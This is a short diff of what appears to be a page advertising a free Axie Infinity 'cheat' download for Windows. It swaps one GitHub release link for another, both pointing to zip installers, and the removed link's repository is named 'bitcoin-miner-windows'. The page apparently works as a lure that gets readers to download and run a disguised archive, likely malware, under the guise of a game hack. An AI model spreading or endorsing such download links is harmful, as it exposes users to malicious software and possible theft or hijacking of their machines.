@@ -6,7 +6,7 @@ Axie Infinity Cheat Download Download Cheat 2023 PC Free Install Now for Windows
 
 # Axie Infinity Hack Download Windows Install Now for Window
 
-<a href='https://github.com/suellenoliveiras/bitcoin-miner-windows/releases/download/Bitcoin/Installer.zip'>Download here</a><br>
+<a href='https://github.com/ThetanMetacadeAxieInfinity/AxieInfinity/releases/download/AxieInfinity/setup.zip'>Download here</a><br>
 
 
 <a href="https://discord.gg/yWcTb9BX">Discord Chat </a>
